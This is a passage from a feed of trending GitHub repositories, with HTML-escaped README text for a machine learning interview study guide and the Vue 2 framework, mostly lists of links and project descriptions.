href=&#34;https://stackify.com/what-is-java-garbage-collection/#:~:text=Java%20garbage%20collection%20is%20the,Machine%2C%20or%20JVM%20for%20short.&amp;amp;text=The%20garbage%20collector%20finds%20these,them%20to%20free%20up%20memory.&#34;&gt;Java garbage collection&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://robertheaton.com/2014/02/09/pythons-pass-by-object-reference-as-explained-by-philip-k-dick/&#34;&gt;Python pass-by-object-reference&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://index-of.es/Varios-2/Fluent%20Python%20Clear%20Concise%20and%20Effective%20Programming.pdf&#34;&gt;Python GIL, Fluent Python, chapter 17&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://realpython.com/intro-to-python-threading/&#34;&gt;Python multithread&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://index-of.es/Varios-2/Fluent%20Python%20Clear%20Concise%20and%20Effective%20Programming.pdf&#34;&gt;Python concurrency, Fluent Python, chapter 18&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Statistics and probability&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The only cheatsheet that you&#39;&#39;ll ever need&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://www.wzchen.com/probability-cheatsheet&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/images/stat_cheatsheet.png&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Learn Bayesian and practice &lt;a href=&#34;https://blogs.kent.ac.uk/jonw/files/2015/04/Puza2005.pdf&#34;&gt;problems in Bayesian&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Let A and B be events on the same sample space, with P (A) = 0.6 and P (B) = 0.7. Can these two events be disjoint?&lt;/li&gt; &#xA; &lt;li&gt;Given that Alice has 2 kids, at least one of which is a girl, what is the probability that both kids are girls? (credit &lt;a href=&#34;https://www.reddit.com/user/swierdo/&#34;&gt;swierdo&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;A group of 60 students is randomly split into 3 classes of equal size. All partitions are equally likely. Jack and Jill are two students belonging to that group. What is the probability that Jack and Jill will end up in the same class?&lt;/li&gt; &#xA; &lt;li&gt;Given an unfair coin with the probability of heads not equal to .5. What algorithm could you use to create a list of random 1s and 0s.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Big data (NOT required for Google, Facebook interview)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Spark &lt;a href=&#34;http://datastrophic.io/core-concepts-architecture-and-internals-of-apache-spark/&#34;&gt;architecture&lt;/a&gt; and Spark &lt;a href=&#34;https://databricks.com/blog/2016/08/31/apache-spark-scale-a-60-tb-production-use-case.html&#34;&gt;lessons learned&lt;/a&gt; (outdated since Spark 3.0 release)&lt;/li&gt; &#xA; &lt;li&gt;Spark &lt;a href=&#34;https://stackoverflow.com/questions/21138751/spark-java-lang-outofmemoryerror-java-heap-space&#34;&gt;OOM&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Cassandra &lt;a href=&#34;https://tech.ebayinc.com/engineering/cassandra-data-modeling-best-practices-part-1/&#34;&gt;best practice&lt;/a&gt; and &lt;a href=&#34;https://cassandra.apache.org/doc/latest/data_modeling/intro.html&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;https://towardsdatascience.com/when-to-use-cassandra-and-when-to-steer-clear-72b7f2cede76!%5Bimage%5D(https://user-images.githubusercontent.com/1975237/109818900-5a25fc00-7be8-11eb-8715-ca7d279e84b6.png)&#34;&gt;link&lt;/a&gt;, &lt;a href=&#34;https://www.scnsoft.com/blog/cassandra-performance&#34;&gt;cassandra performance&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Practice problem &lt;a href=&#34;http://stevekrenzel.com/finding-friends-with-mapreduce&#34;&gt;finding friends with MapReduce&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Everything in &lt;a href=&#34;https://mlengineer.io/big-data-knowledge-for-machine-learning-engineer-interview-2020-148d7c335e12?source=friends_link&amp;amp;sk=604c593c522db5195d3bda33dc4662d7&#34;&gt;one page&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;ML fundamentals&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://statisticsbyjim.com/regression/multicollinearity-in-regression-analysis/&#34;&gt;Collinearity&lt;/a&gt; and &lt;a href=&#34;https://www.youtube.com/watch?v=Cba9LJ9lS8s&#34;&gt;read more&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sebastianraschka.com/Articles/2014_about_feature_scaling.html&#34;&gt;Features scaling&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@aravanshad/gradient-boosting-versus-random-forest-cfa3fa8f0d80&#34;&gt;Random forest vs GBDT&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/1106.1813.pdf&#34;&gt;SMOTE synthetic minority over-sampling technique&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mlengineer/generative-and-discriminative-models-af5637a66a3&#34;&gt;Compare discriminative vs generative model&lt;/a&gt; and &lt;a href=&#34;http://ai.stanford.edu/~ang/papers/nips01-discriminativegenerative.pdf&#34;&gt;extra read&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=-la3q9d7AKQ&#34;&gt;Logistic regression&lt;/a&gt;. Try to implement logistic regression from scratch. Bonus point for vectorized version in numpy + completed in 20 minutes &lt;a href=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/sample/logistic_regression.ipynb&#34;&gt;sample code from martinpella&lt;/a&gt;. Followup with MapReduce version.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=s203ScTy4xQ&amp;amp;t=954s&#34;&gt;Quantile regression&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.linkedin.com/pulse/intuitive-visual-explanation-differences-between-l1-l2-xiaoli-chen/&#34;&gt;L1/L2 intuition&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://people.csail.mit.edu/dsontag/courses/ml16/slides/lecture11.pdf&#34;&gt;Decision tree and Random Forest fundamental&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://web.stanford.edu/~hastie/TALKS/boost.pdf&#34;&gt;Explain boosting&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=_-Gnu498s3o&#34;&gt;Least Square as Maximum Likelihood Estimator&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=WflqTUOvdik&amp;amp;t=15s&#34;&gt;Maximum Likelihood Estimator introduction&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://stanford.edu/~cpiech/cs221/handouts/kmeans.html&#34;&gt;Kmeans&lt;/a&gt;. Try to implement Kmeans from scratch &lt;a href=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/sample/kmeans.ipynb&#34;&gt;sample code from flothesof.github.io&lt;/a&gt;. Bonus point for vectorized version in numpy + completed in 20 minutes. Follow-up with worst case time complexity and improvement for &lt;a href=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/extra.md&#34;&gt;initialization&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Fundamentals about &lt;a href=&#34;http://alexhwilliams.info/itsneuronalblog/2016/03/27/pca/&#34;&gt;PCA&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;I didn&#39;t use &lt;a href=&#34;https://machinelearningflashcards.com/&#34;&gt;flashcard&lt;/a&gt; but I&#39;m sure it helps up to certain extend.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;AB testing&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.researchgate.net/publication/339914315_Trustworthy_Online_Controlled_Experiments_A_Practical_Guide_to_AB_Testing&#34;&gt;Trustworthy Online Controlled Experiments: A Practical Guide to A/B Testing&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;DL fundamentals&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.deeplearningbook.org/&#34;&gt;The deep learning book&lt;/a&gt;. Read &lt;a href=&#34;https://www.deeplearningbook.org/contents/part_practical.html&#34;&gt;Part ii&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://d2wvfoqc9gyqzf.cloudfront.net/content/uploads/2018/09/Ng-MLY01-13.pdf&#34;&gt;Machine Learning Yearning&lt;/a&gt;. Read from section 5 to section 27.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://cs231n.stanford.edu/slides/2020/lecture_4.pdf&#34;&gt;Neural network and backpropagation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://missinglink.ai/guides/neural-network-concepts/7-types-neural-network-activation-functions-right/&#34;&gt;Activation functions&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://cs231n.stanford.edu/slides/2020/lecture_3.pdf&#34;&gt;Loss and optimization&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://cs231n.github.io/convolutional-networks/&#34;&gt;Convolution Neural network notes&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://cs231n.stanford.edu/slides/2020/lecture_10.pdf&#34;&gt;Recurrent Neural Networks&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;ML system design&lt;/h3&gt; &#xA;&lt;h4&gt;ML classic paper&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://papers.nips.cc/paper/5656-hidden-technical-debt-in-machine-learning-systems.pdf&#34;&gt;Technical debt in ML&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://developers.google.com/machine-learning/guides/rules-of-ml&#34;&gt;Rules of ML&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://joschu.net/blog/opinionated-guide-ml-research.html&#34;&gt;An Opinionated Guide to ML Research&lt;/a&gt;. There is valuable advice in the Personal development section at the bottom.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;ML productions&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://eng.uber.com/scaling-michelangelo/&#34;&gt;Scaling ML at Uber&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alirezadir/Production-Level-Deep-Learning&#34;&gt;DL in production&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Food delivery&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://eng.uber.com/uber-eats-trip-optimization/&#34;&gt;Uber eats trip optimization&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://eng.uber.com/uber-eats-query-understanding/&#34;&gt;Uber food discovery&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.doordash.com/personalized-store-feed-with-vector-embeddings-251ad7a2c09a&#34;&gt;Personalized store feed&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://doordash.engineering/2020/02/28/next-generation-optimization-for-dasher-dispatch-at-doordash/&#34;&gt;Doordash dispatch optimization&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;ML design common usecases&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://interview.mlengineer.io/&#34;&gt;ML system design primer&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://interview.mlengineer.io/&#34;&gt;Video recommendation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://interview.mlengineer.io/&#34;&gt;Feed ranking&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Fraud detection (TBD)&lt;/h4&gt; &#xA;&lt;h4&gt;Adtech&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://storage.googleapis.com/pub-tools-public-publication-data/pdf/41159.pdf&#34;&gt;Ad click prediction trend&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://research.fb.com/wp-content/uploads/2016/11/practical-lessons-from-predicting-clicks-on-ads-at-facebook.pdf&#34;&gt;Ad Clicks CTR&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.twitter.com/engineering/en_us/topics/insights/2019/improving-engagement-on-digital-ads-with-delayed-feedback.html&#34;&gt;Delayed feedbacks&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.twitter.com/engineering/en_us/topics/insights/2018/embeddingsattwitter.html&#34;&gt;Entity embedding&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/1709.03856.pdf&#34;&gt;Star space, embedding all the things&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.twitter.com/engineering/en_us/topics/insights/2017/using-deep-learning-at-scale-in-twitters-timelines.html&#34;&gt;Twitter timeline ranking&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Recommendations:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://ai.facebook.com/blog/powered-by-ai-instagrams-explore-recommender-system/&#34;&gt;Instagram explore&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://newsroom.tiktok.com/en-us/how-tiktok-recommends-videos-for-you&#34;&gt;TikTok recommendation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45530.pdf&#34;&gt;Deep Neural Networks for YouTube Recommendations&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://arxiv.org/pdf/1606.07792.pdf%29/&#34;&gt;Wide &amp;amp; Deep Learning for Recommender Systems&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Testimonials&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;V, Amazon L5 DS&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;I really found the quizzes very helpful for testing my ML understanding. Also, the resources shared helped me a lot for revising concepts for my interview preparation. This course will definitely help engineers crack Machine Learning Engineering and Data Science interviews.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;K, Facebook MLE&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;I really like what you&#39;ve built, it&#39;ll help a lot of engineers.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;D, NVIDIA DS&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;I have been using your github repo to prep for my interviews and got an offer with NVIDIA with their data science team. Thanks again for your help!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A, Booking&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Woow this is very useful summaries, so nice.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;H, Microsoft&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;That&#39;s incredible!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;V, Intel&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;The repo is extremely cohesive! Thanks again.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Intro&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;This repo is written based on REAL interview questions from big companies and the study materials are based on legit experts i.e Andrew Ng, Yoshua Bengio etc.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;I have 6 YOE in Machine Learning and have interviewed more than dozen big companies. This is the &lt;strong&gt;minimum&lt;/strong&gt; viable study plan that covers all actual interview questions from Facebook, Amazon, Apple, Google, MS, SnapChat, Linkedin etc.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you&#39;re interested to learn more about paid ML system design course, &lt;a href=&#34;https://raw.githubusercontent.com/khangich/machine-learning-interview/master/course.md&#34;&gt;click here&lt;/a&gt;. This course will provide 6-7 practical usecases with proven solutions. After this course you will be able to solve new problem with systematic approach.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Acknowledgements and contributing&lt;/h1&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;Thanks for early feedbacks and contributions from &lt;a href=&#34;https://github.com/liuvivian11&#34;&gt;Vivian&lt;/a&gt;, &lt;a href=&#34;https://github.com/aragorn87&#34;&gt;aragorn87&lt;/a&gt; and others. You can create an Issue or Pull Request on this repo. You can also help upvote on &lt;a href=&#34;https://www.producthunt.com/posts/machine-learning-interview-guideline&#34;&gt;ProductHunt&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you find this helpful, you can Sponsor this project. It&#39;s cool if you don&#39;t.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Thanks to this community, we have donated about $200 to &lt;a href=&#34;https://www.hopeforpaws.org/&#34;&gt;HopeForPaws&lt;/a&gt;. If you want to support, you can contribute too on their website.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
  <entry>
    <title>vuejs/vue</title>
    <updated>2022-06-03T01:29:53Z</updated>
    <id>tag:github.com,2022-06-03:/vuejs/vue</id>
    <link href="https://github.com/vuejs/vue" rel="alternate"></link>
    <summary type="html">&lt;p&gt;🖖 Vue.js is a progressive, incrementally-adoptable JavaScript framework for building UI on the web.&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt;&lt;a href=&#34;https://vuejs.org&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;&lt;img width=&#34;100&#34; src=&#34;https://vuejs.org/images/logo.png&#34; alt=&#34;Vue logo&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://circleci.com/gh/vuejs/vue/tree/dev&#34;&gt;&lt;img src=&#34;https://img.shields.io/circleci/project/github/vuejs/vue/dev.svg?sanitize=true&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/github/vuejs/vue?branch=dev&#34;&gt;&lt;img src=&#34;https://img.shields.io/codecov/c/github/vuejs/vue/dev.svg?sanitize=true&#34; alt=&#34;Coverage Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://npmcharts.com/compare/vue?minimal=true&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/dm/vue.svg?sanitize=true&#34; alt=&#34;Downloads&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.npmjs.com/package/vue&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/v/vue.svg?sanitize=true&#34; alt=&#34;Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.npmjs.com/package/vue&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/l/vue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://chat.vuejs.org/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/chat-on%20discord-7289da.svg?sanitize=true&#34; alt=&#34;Chat&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h2&gt;This repo is for Vue 2&lt;/h2&gt; &#xA;&lt;p&gt;You are looking at the repository for Vue 2. The repo for Vue 3 is &lt;a href=&#34;https://github.com/vuejs/core&#34;&gt;vuejs/core&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Sponsors&lt;/h2&gt; &#xA;&lt;p&gt;Vue.js is an MIT-licensed open source project with its ongoing development made possible entirely by the support of these awesome &lt;a href=&#34;https://github.com/vuejs/core/raw/main/BACKERS.md&#34;&gt;backers&lt;/a&gt;. If you&#39;d like to join them, please consider &lt;a href=&#34;https://vuejs.org/sponsor/&#34;&gt; sponsor Vue&#39;s development&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a target=&#34;_blank&#34; href=&#34;https://vuejs.org/sponsor/&#34;&gt; &lt;img alt=&#34;sponsors&#34; src=&#34;https://sponsors.vuejs.org/sponsors.svg?sanitize=true&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;Vue (pronounced &lt;code&gt;/vjuː/&lt;/code&gt;, like view) is a &lt;strong&gt;progressive framework&lt;/strong&gt; for building user interfaces. It is designed from the ground up to be incrementally adoptable, and can easily scale between a library and a framework depending on different use cases. It consists of an approachable core library that focuses on the view layer only, and an ecosystem of supporting libraries that helps you tackle complexity in large Single-Page Applications.&lt;/p&gt; &#xA;&lt;h4&gt;Browser Compatibility&lt;/h4&gt; &#xA;&lt;p&gt;Vue.js supports all browsers that are &lt;a href=&#34;https://kangax.github.io/compat-table/es5/&#34;&gt;ES5-compliant&lt;/a&gt; (IE8 and below are not supported).&lt;/p&gt; &#xA;&lt;h2&gt;Ecosystem&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Project&lt;/th&gt; &#xA;   &lt;th&gt;Status&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/vuejs/vue-router&#34;&gt;vue-router&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://npmjs.com/package/vue-router&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/v/vue-router.svg?sanitize=true&#34; alt=&#34;vue-router-status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Single-page application routing&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/vuejs/vuex&#34;&gt;vuex&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://npmjs.com/package/vuex&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/v/vuex.svg?sanitize=true&#34; alt=&#34;vuex-status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Large-scale state management&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/vuejs/vue-cli&#34;&gt;vue-cli&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://npmjs.com/package/@vue/cli&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/v/@vue/cli.svg?sanitize=true&#34; alt=&#34;vue-cli-status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Project scaffolding&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/vuejs/vue-loader&#34;&gt;vue-loader&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://npmjs.com/package/vue-loader&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/v/vue-loader.svg?sanitize=true&#34; alt=&#34;vue-loader-status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Single File Component (&lt;code&gt;*.vue&lt;/code&gt; file) loader for webpack&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/vuejs/vue/tree/dev/packages/vue-server-renderer&#34;&gt;vue-server-renderer&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://npmjs.com/package/vue-server-renderer&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/v/vue-server-renderer.svg?sanitize=true&#34; alt=&#34;vue-server-renderer-status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Server-side rendering support&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/vuejs/vue-class-component&#34;&gt;vue-class-component&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://npmjs.com/package/vue-class-component&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/v/vue-class-component.svg?sanitize=true&#34; alt=&#34;vue-class-component-status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;TypeScript decorator for a class-based API&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/vuejs/vue-rx&#34;&gt;vue-rx&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://npmjs.com/package/vue-rx&#34;&gt;&lt;img src=&#34;https://img.shields.io/npm/v/vue-rx.svg?sanitize=true&#34; alt=&#34;vue-rx-status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;RxJS integration&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/vuejs/vue-devtools&#34;&gt;vue-devtools&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://chrome.google.com/webstore/detail/vuejs-devtools/nhdogjmejiglipccpnnnanhbledajbpd&#34;&gt;&lt;img src=&#34;https://img.shields.io/chrome-web-store/v/nhdogjmejiglipccpnnnanhbledajbpd.svg?sanitize=true&#34; alt=&#34;vue-devtools-status&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Browser DevTools extension&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;To check out &lt;a href=&#34;https://vuejs.org/v2/examples/&#34;&gt;live examples&lt;/a&gt; and docs, visit &lt;a href=&#34;https://vuejs.org&#34;&gt;vuejs.org&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Questions&lt;/h2&gt; &#xA;&lt;p&gt;For questions and support please use &lt;a href=&#34;https://forum.vuejs.org&#34;&gt;the official forum&lt;/a&gt; or &lt;a href=&#34;https://chat.vuejs.org/&#34;&gt;community chat&lt;/a&gt;. The issue list of this repo is &lt;strong&gt;exclusively&lt;/strong&gt; for bug reports and feature requests.&lt;/p&gt; &#xA;&lt;h2&gt;Issues&lt;/h2&gt; &#xA;&lt;p&gt;Please make sure to read the &lt;a href=&#34;https://github.com/vuejs/vue/raw/dev/.github/CONTRIBUTING.md#issue-reporting-guidelines&#34;&gt;Issue Reporting Checklist&lt;/a&gt; before opening an issue. Issues not conforming to the guidelines may be closed immediately.&lt;/p&gt; &#xA;&lt;h2&gt;Changelog&lt;/h2&gt; &#xA;&lt;p&gt;Detailed changes for each release are documented in the &lt;a href=&#34;https://github.com/vuejs/vue/releases&#34;&gt;release notes&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Stay In Touch&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/vuejs&#34;&gt;Twitter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a 